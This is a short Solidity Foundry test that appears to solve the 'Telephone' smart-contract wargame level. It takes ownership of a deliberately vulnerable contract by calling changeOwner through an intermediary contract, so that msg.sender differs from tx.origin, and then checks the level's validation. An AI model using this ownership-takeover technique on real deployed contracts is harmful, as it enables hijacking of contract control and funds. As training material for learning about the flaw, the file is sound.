// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./TelephoneFactory.sol";

contract TelephoneTest is Test {
    TelephoneFactory factory;

    function setUp() public {
        factory = new TelephoneFactory();
    }

    function testTelephone() public {
        address telephone = factory.createInstance(address(this));

        // vm.prank(vm.addr(uint256(keccak256("msg.sender"))), vm.addr(uint256(keccak256("tx.origin"))));

        Telephone(telephone).changeOwner(address(this));

        assertTrue(factory.validateInstance(payable(address(telephone)), address(this)));
    }
}
